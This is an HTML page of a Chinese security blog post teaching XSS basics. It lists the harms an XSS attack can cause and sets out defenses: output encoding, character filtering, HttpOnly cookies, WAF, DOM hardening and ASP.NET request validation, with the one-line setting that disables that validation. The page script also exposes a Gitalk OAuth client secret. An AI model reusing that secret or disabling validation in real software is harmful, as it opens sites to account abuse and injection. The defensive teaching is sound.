+<li><strong>5.利用iframe、frame、XMLHttpRequest或上述Flash等方式，</strong>以（被攻击）用户的身份执行一些管理动作，或执行一些一般的操作如发微博、加好友、发私信等操作。</li>
+<li><strong>6.利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动</strong>。在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDOS攻击的效果。</li>
+<li><strong>7.修改网页内容</strong></li>
+<li><strong>8.网站挂马</strong></li>
+<li><strong>9.XSS蠕虫</strong></li>
+<li><strong>10.利用网站重定向</strong></li>
+</ul>
+<ul>
+<li><strong>尽管这些攻击类型大不相同，但都有一条重要的相似之处：</strong><ul>
+<li><strong>因为攻击者把代码注入进的页面是由网站的，所以恶意脚本都是在网站的上下文环境中执行，这就意味着恶意代码被当作网站提供的其他正常脚本一样对待</strong></li>
+<li><strong>这些事实都在强调一个关键性问题：如果攻击者能够借助你的网站在另一个用户的浏览器中执行任意脚本，那么你网站的安全性已经无从谈起了</strong></li>
+</ul>
+</li>
+</ul>
+<h3 id="八、XSS的防御措施"><a href="#八、XSS的防御措施" class="headerlink" title="八、XSS的防御措施"></a><strong>八、XSS的防御措施</strong></h3><h4 id="（一）调用函数"><a href="#（一）调用函数" class="headerlink" title="（一）调用函数"></a><strong>（一）调用函数</strong></h4><ul>
+<li>对于用户提交的数据可以通过调用函数进行过滤</li>
+<li>htmlspecialchars()函数将输出的内容进行HTML的编码，效果最好</li>
+<li>str_replace()函数可以将指定的字符串转换为其他字符串的，但是会被绕过</li>
+</ul>
+<h4 id="（二）使用XSS-Filter"><a href="#（二）使用XSS-Filter" class="headerlink" title="（二）使用XSS Filter"></a><strong>（二）使用XSS Filter</strong></h4><h5 id="（1）输入过滤"><a href="#（1）输入过滤" class="headerlink" title="（1）输入过滤"></a><strong>（1）输入过滤</strong></h5><ul>
+<li><strong>输入验证（客户端）：</strong>前端JS过滤，如检测最大长度、是否只有合法字符、格式是否符合要求、数字是否在指定的范围内。</li>
+<li>缺点：容易被修改掉。</li>
+<li><strong>数据消毒（服务器端）：</strong>过滤敏感字符（可以和SQL注入的一同过滤）<ul>
+<li>如：< > javascript ‘ “ & # expression等...</li>
+</ul>
+</li>
+</ul>
+<h5 id="（2）-输出编码（服务器端）"><a href="#（2）-输出编码（服务器端）" class="headerlink" title="（2） 输出编码（服务器端）"></a><strong>（2） 输出编码（服务器端）</strong></h5><ul>
+<li><p><strong>可以使用HTML编码</strong></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">PHP</span>的<span class="selector-tag">htmlspecialchars</span>()函数</span><br><span class="line"><span class="selector-tag">ASP</span>的<span class="selector-tag">Server</span><span class="selector-class">.HTMLEncode</span>()函数</span><br><span class="line"><span class="selector-tag">ASP</span><span class="selector-class">.NET</span>的<span class="selector-tag">Server</span><span class="selector-class">.HtmlEncode</span>()函数</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>用对应的HTML实体替代字面量字符，此时浏览器会将恶意代码当作HTML文档的内容而不是结构加以处理</strong></p>
+</li>
+<li><p><strong>常见恶意字符的HTML编码（显示、实体名字、实体编号）：</strong></p>
+</li>
+</ul>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;  <span class="variable">&amp;lt</span>;  &amp;#<span class="number">60</span>；</span></span><br><span class="line"><span class="params">&gt;</span>  <span class="variable">&amp;gt</span>;  &amp;<span class="meta">#62；</span></span><br><span class="line">&amp;  <span class="variable">&amp;amp</span>;  &amp;<span class="meta">#38；</span></span><br><span class="line">“  <span class="variable">&amp;quot</span>;  &amp;<span class="meta">#34；</span></span><br><span class="line">‘          &amp;<span class="meta">#39;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="（三）白名单和黑名单结合"><a href="#（三）白名单和黑名单结合" class="headerlink" title="（三）白名单和黑名单结合"></a><strong>（三）白名单和黑名单结合</strong></h4><h4 id="（四）Noscript"><a href="#（四）Noscript" class="headerlink" title="（四）Noscript"></a><strong>（四）Noscript</strong></h4><ul>
+<li><strong>Firefox的一款免费的开源插件，默认禁止所有脚本，但是可以通过自定义设置允许通过的脚本</strong></li>
+</ul>
+<h4 id="（五）Anti-XSS"><a href="#（五）Anti-XSS" class="headerlink" title="（五）Anti_XSS"></a><strong>（五）Anti_XSS</strong></h4><ul>
+<li><strong>提供大量的编码函数用于处理用户的输入，实现白名单机制和输出转义</strong></li>
+</ul>
+<h4 id="（六）HttpOnly"><a href="#（六）HttpOnly" class="headerlink" title="（六）HttpOnly"></a><strong>（六）HttpOnly</strong></h4><ul>
+<li><p>攻击者通过XSS漏洞执行JS中的document.cookie方法来窃取用户的cookie信息。Web应用程序在Set-Cookie时将其属性设为HttpOnly即可避免Cookie被客户端JS存取，也可以保护用户的Cookie信息不被盗取。</p>
+</li>
+<li><p><strong>PHP设置HttpOnly的方法：</strong></p>
+ <figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>） 修改php.ini文件，设置其值为<span class="number">1</span>或<span class="literal">TRUE</span>；</span><br><span class="line">（<span class="number">2</span>） setcookie()函数和setrawcookie()函数的第七个参数</span><br><span class="line">（<span class="number">3</span>）在PHP代码中开启</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="（七）Web安全编码规范"><a href="#（七）Web安全编码规范" class="headerlink" title="（七）Web安全编码规范"></a><strong>（七）Web安全编码规范</strong></h4><ul>
+<li><strong>对敏感字符转义、URL属性进行相应的规定等</strong></li>
+</ul>
+<h4 id="（八）尽量使用WAF"><a href="#（八）尽量使用WAF" class="headerlink" title="（八）尽量使用WAF"></a><strong>（八）尽量使用WAF</strong></h4><h4 id="（九）防御DOM型XSS"><a href="#（九）防御DOM型XSS" class="headerlink" title="（九）防御DOM型XSS"></a><strong>（九）防御DOM型XSS</strong></h4><ul>
+<li>DOM型XSS主要是由客户端的脚本通过DOM动态地输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。</li>
+<li>其防御在于：<ul>
+<li>（1） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现；</li>
+<li>（2） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码转义，如输出到HTML则进行HTML编码、输出到<script>则进行JS编码。</li>
+</ul>
+</li>
+</ul>
+<h4 id="（十）ASP-NET中的XSS安全机制"><a href="#（十）ASP-NET中的XSS安全机制" class="headerlink" title="（十）ASP.NET中的XSS安全机制"></a><strong>（十）ASP.NET中的XSS安全机制</strong></h4><ul>
+<li><p>ASP.NET中有防范XSS的机制，对提交的表单会自动检查是否存在XSS，当用户试图输入XSS代码的时候，ASP.NET会抛出一个错误</p>
+</li>
+<li><p>很多程序员对安全没有概念， 甚至不知道有XSS的存在。 ASP.NET在这一点上做到默认安全。 这样的话就算是没有安全意识的程序员也能写出一个”较安全的网站“。</p>
+</li>
+<li><p>如果想禁止这个安全特性， 可以通过</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ <span class="built_in"> Page </span> <span class="attribute">validateRequest</span>=“false”  %&gt;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+</script></li></ul>
+    </div>
+    <div>
+    
+       <div>
+      
+          <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+      
+  </div>
+    
+    </div>
+
+    
+    
+    
+        
+      
+        <div id="reward-container">
+  <div>这么年轻就乞讨，很难说是出于自己的选择，还是被命运一巴掌扇到了这样的处境。</div>
+  <button id="reward-button" disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+        
+      
+      <div style="display: inline-block">
+        <img src="/images/wechatpay.jpg" alt="xx_C1 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>xx_C1</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://github.com/xx-C1/xx-C1.github.io/2018/07/08/Web安全—XSS基础/" title="Web安全—XSS基础">https://github.com/xx-C1/xx-C1.github.io/2018/07/08/Web安全—XSS基础/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/XSS/" rel="tag"><i class="fa fa-tag"></i>XSS</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2018/07/07/Web认证授权4—OAuth、 SSO、OpenID/" rel="next" title="Web认证授权4—OAuth、SSO、OpenID.md">
+                  <i class="fa fa-chevron-left"></i> Web认证授权4—OAuth、SSO、OpenID.md
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2018/07/09/Web安全—XSS触发、绕过、盗取Cookie/" rel="prev" title="Web安全—XSS触发、绕过、盗取Cookie">
+                  Web安全—XSS触发、绕过、盗取Cookie <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、JavaScript相关语法"><span class="nav-text">一、JavaScript相关语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（一）基础语法"><span class="nav-text">（一）基础语法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（二）wiondow-open-：是window对象中的open-方法"><span class="nav-text">（二）wiondow.open()：是window对象中的open()方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（三）document-password-pass-value"><span class="nav-text">（三）document.password.pass.value</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（四）javascript-alert"><span class="nav-text">（四）javascript alert()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、XSS定义"><span class="nav-text">二、XSS定义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、-XSS的原理"><span class="nav-text">三、 XSS的原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四、XSS的攻击方式"><span class="nav-text">四、XSS的攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（一）反射型"><span class="nav-text">（一）反射型</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#场景一"><span class="nav-text">场景一</span></a></li></ol></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/dxx.jpg"
+      alt="xx_C1">
+  <p class="site-author-name" itemprop="name">xx_C1</p>
+  <div class="site-description" itemprop="description">Cyberspace Security</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/xx-C1" title="GitHub &rarr; https://github.com/xx-C1"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:iduxinxing@gmail.com" title="E-Mail &rarr; mailto:iduxinxing@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://p0sec.net/" title="https://p0sec.net/" rel="noopener" target="_blank">p0</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://seaii-blog.com/" title="https://seaii-blog.com/" rel="noopener" target="_blank">seaii</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="http://syf.ac.cn/" title="http://syf.ac.cn/" rel="noopener" target="_blank">7N1ght</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://www.windylh.com/" title="https://www.windylh.com/" rel="noopener" target="_blank">windylh</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="http://zhengbao.wang" title="http://zhengbao.wang" rel="noopener" target="_blank">Boogle</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://v0w.top" title="https://v0w.top" rel="noopener" target="_blank">vOw</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://ttonys.github.io/" title="https://ttonys.github.io/" rel="noopener" target="_blank">tongs</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://daolgts.github.io" title="https://daolgts.github.io" rel="noopener" target="_blank">daolgts</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="http://j0k3r.top/" title="http://j0k3r.top/" rel="noopener" target="_blank">joker</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://wzt.ac.cn/" title="https://wzt.ac.cn/" rel="noopener" target="_blank">CataLpa</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="http://asa9ao.xyz/" title="http://asa9ao.xyz/" rel="noopener" target="_blank">Asa9ao</a>
+        </li>
+      
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xx_C1</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">102k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:50</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.1</div>
+-->
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
+<script src="/js/schemes/pisces.js?v=7.4.1"></script>
+
+<script src="/js/next-boot.js?v=7.4.1"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.1"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID: 'e359eec42038f3a7de62',
+      clientSecret: '307c95e8834b62ce80a30e3b9b3ad850eee61b74',
+      repo: 'gitalk-comment',
+      owner: 'xx-C1',
+      admin: ['xx-C1'],
+      id: '34dd7839f2ec3e692d7fbabb2ecdcf48',
+        language: 'zh-CN',
+      
+      distractionFreeMode: 'true'
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":80,"height":132},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
